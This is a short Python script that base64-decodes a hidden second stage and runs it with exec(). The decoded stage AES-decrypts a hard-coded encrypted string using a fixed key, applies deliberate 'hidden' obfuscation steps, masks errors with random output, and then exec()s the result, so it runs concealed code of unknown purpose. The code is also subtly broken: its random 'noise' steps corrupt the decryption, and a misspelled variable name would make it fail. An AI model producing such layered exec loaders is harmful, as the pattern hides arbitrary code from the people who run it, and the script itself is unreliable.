import base64

# The base64 encoded string
encoded_code = """
aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwpmcm9tIENyeXB0by5VdGlsLlBhZGRpbmcgaW1wb3J0IHVucGFkCmltcG9ydCByYW5kb20KaW1wb3J0IHN0cmluZwoKIyAzMi1ieXRlIGVuY3J5cHRpb24ga2V5IChrZWVwIGl0IHNlY3JldCkKazEgPSAiMTExLTIyMi0zMzMiICAjIFJlcGxhY2Ugd2l0aCB5b3VyIHJlYWwga2V5CgojIEhlbHBlciBmdW5jdGlvbiB0byByYW5kb21seSBjaGFuZ2UgY2hhcmFjdGVycyBpbiBhIHN0cmluZwpkZWYgX3JhbmRfc3RyKG4pOgogICAgcmV0dXJuICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuYXNjaWlfbGV0dGVycyArIHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKG4pKQoKIyBIZWxwZXIgdG8gY3JlYXRlIG9iZnVzY2F0ZWQgb3BlcmF0aW9ucwpkZWYgX3hvcihhLCBiKToKICAgIHJldHVybiBieXRlcyhbeCBeIHkgZm9yIHgsIHkgaW4gemlwKGEsIGIpXSkKCmRlZiBfbXVsdGlwbHkoYSwgYik6CiAgICByZXR1cm4gYSAqIGIKCmRlZiBfY29uY2F0KGEsIGIpOgogICAgcmV0dXJuIGEgKyBiCgpkZWYgX2RlY29kZV9iYXNlNjQoYSk6CiAgICByZXR1cm4gYmFzZTY0LmI2NGRlY29kZShhKQoKZGVmIF9zaGEyNTZfaGFzaChhKToKICAgIHJldHVybiBoYXNobGliLnNoYTI1NihhLmVuY29kZSgpKS5kaWdlc3QoKQoKZGVmIF9kZWNyeXB0X3NpbXBsaWZpZWQoYTEsIGEyLCBrZXkpOgogICAgZDEgPSBfc2hhMjU2X2hhc2goa2V5KSAgIyBHZXQgdGhlIGhhc2ggb2YgdGhlIGtleQogICAgY2lwaGVyID0gQUVTLm5ldyhkMSwgQUVTLk1PREVfQ0JDLCBhMSkgICMgQUVTIGRlY3J5cHRpb24KICAgIGRlY3J5cHRlZCA9IHVucGFkKGNpcGhlci5kZWNyeXB0KGEyKSwgQUVTLmJsb2NrX3NpemUpICAjIFVucGFkIHRoZSByZXN1bHQKICAgIHJldHVybiBkZWNyeXB0ZWQKCmRlZiBfaGlkZGVuX2xvZ2ljKHMxLCBzMik6CiAgICByYW5kb21fb3AgPSByYW5kb20uY2hvaWNlKFtfeG9yLCBfbXVsdGlwbHksIF9jb25jYXRdKQogICAgcmV0dXJuIHJhbmRvbV9vcChzMSwgczIpCgpkZWYgX2dldF9wYXJ0cyhhKToKICAgICMgU3BsaXQgZW5jcnlwdGVkIHN0cmluZyBhbmQgdXNlIFhPUiB0byBvYnNjdXJlIHRoZSBwYXJ0cwogICAgYiA9IGEuc3BsaXQoIjoiKQogICAgcmV0dXJuIGJ5dGVzLmZyb21oZXgoYlswXSksIGJ5dGVzLmZyb21oZXgoYlsxXSkKCmRlZiBfb2JmdXNjYXRlZF9kZWNyeXB0KGVuY19zdHIsIGtleSk6CiAgICB0cnk6CiAgICAgICAgIyBPYmZ1c2NhdGUgZXZlcnkgc3RlcAogICAgICAgIHBhcnQxLCBwYXJ0MiA9IF9nZXRfcGFydHMoZW5jX3N0cikgICMgU3BsaXQgZW5jcnlwdGVkIGRhdGEKCiAgICAgICAgZGVjcnlwdGVkID0gX2RlY3J5cHRfc2ltcGxpZmllZChwYXJ0MSwgcGFydDIsIGtleSkgICMgQmFzaWMgZGVjcnlwdGlvbgoKICAgICAgICAjIEFwcGx5IG51bWxpcGxlIGhpZGRlbiB0cmFuc2Zvcm1hdGlvbnMgb24gdGhlIGRlY3J5cHRlZCBkYXRhCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgICAgICAgICBkZWNyeXB0ZWQgPSBfaGlkZGVuX2xvZ2ljKGRlY3J5cHRlZCwgX3JhbmRfc3RyKHJhbmRvbS5yYW5kaW50KDUsIDEwKSkuZW5jb2RlKCkpICAjIEFkZCByYW5kb20gbm9pc2UKCiAgICAgICAgZGVjb2RlZCA9IF9kZWNvZGVfYmFzZTY0KGRlY3J5cHRlZCkgICMgQmFzZTY0IGRlY29kZSB0aGUgcmVzdWx0CiAgICAgICAgcmV0dXJuIGRlY29kZWQuZGVjb2RlKCJ1dGYtOCIpICAjIFJldHVybiB0aGUgZmluYWwgZGVjcnlwdGVkIGNvZGUKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gX3JhbmRfc3RyKDEwKSAgIyBSZXR1cm4gYSByYW5kb20gc3RyaW5nIHRvIGhpZGUgdGhlIGVycm9yCgojIEV4YW1wbGUgZW5jcnlwdGVkIHN0cmluZyAocmVwbGFjZSB3aXRoIHlvdXIgYWN0dWFsIGVuY3J5cHRlZCBzdHJpbmcpCmVuY3lwdGVkX3N0cmluZyA9ICAiMDQ5MmY2ZWRhNjU3YTg0NDFkZDVhOWViYjc3YTk0MGY6ZDkzMmUwMTQ3ZTdmYjcwZDQ4NTk2OTQ4MWMzZjU0MWJmNTNiMjQzZDY4OTUzYmUzMGQ3YjEwZGViNTAzN2IzNTRkMTAxMThjZmYxNzgyNjlmODA0ODg4ODQ2NjhlNjYzM2ZmZjc4MWE3NzcyZDJiYzc1NmRhNWIwNjEwZTZlZjQ1NjQzNDExMGM4ZTIyOTkzNjBhM2U4YjNiZDQ3NTU0NjhkZjAzYzE2NWExOTUzNGNkYjgyYThlMmRiN2IyY2Y3NzRlOWMwZWRkOGM3MGEzMDMzMmU5ODU5YjA1OWU4OTFhMGIzOWQwYTk1MDdhNDk3ODM0NDExYmYzN2ZiM2VhY2M4ZDZiYWRkNjc3MjU1NGI1NGYzNTlmMDUxZjc0NmQzNGQyZjQ1OGQwMjAyOGYxZWNlNmM1ZmMyYjM3MTI4MWQ3OTY2ZjgyOTY0MmI2OTg2OTNhNjE3YTIyOTgyZGZkYWY2MTAyOTk2NGE5YTYwZmE2ZmQ4MDgwNDMxZjE4NTI4MjNmOGQ4YmQwZjg3NjNjYTk5MzYzYmJhN2YyZjk1Yzg5MmI2Y2U5NWYyZGI5ZWU0YWEwMjQxMjMyOWExMDFlYiIKCiMgRGVjcnlwdGluZyB0aGUgY29kZSBhbmQgZXhlY3V0aW5nIGl0CmRlY3J5cHRlZF9jb2RlID0gX29iZnVzY2F0ZWRfZGVjcnlwdChlbmNyeXB0ZWRfc3RyaW5nLCBrMSkKCmlmICJmYWlsZWQiIG5vdCBpbiBkZWNyeXB0ZWRfY29kZToKICAgIHByaW50KCJFeGVjdXRpbmcgRGVjcnlwdGVkIENvZGUuLi4KIikKICAgIGV4ZWMoZGVjcnlwdGVkX2NvZGUpICAjIEV4ZWN1dGVzIHRoZSBkZWNyeXB0ZWQgY29kZQplbHNlOgogICAgcHJpbnQoZGVjcnlwdGVkX2NvZGUp
"""

# Decode the Base64 string
decoded_code = base64.b64decode(encoded_code).decode('utf-8')

# Execute the decoded code
exec(decoded_code)
